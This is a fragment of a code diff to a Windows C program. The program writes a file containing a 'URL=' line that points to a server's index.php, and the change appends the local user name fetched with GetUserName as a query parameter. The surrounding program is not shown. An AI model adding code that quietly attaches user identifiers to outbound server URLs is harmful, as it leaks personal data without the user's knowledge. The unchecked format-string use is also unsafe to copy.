@@ -222,7 +222,8 @@ int main() {
 	fprintf(fp, "\n");
 	fprintf(fp, "URL=");
 	fprintf(fp, inet_ntoa(server.sin_addr));
-	fprintf(fp, "/index.php");
+	GetUserName(sbuf, (LPDWORD)&sbuf_size);
+	fprintf(fp, "/index.php?user=%s", sbuf);
 	fclose(fp);
 
 	fp = fopen("status.txt", "w+");
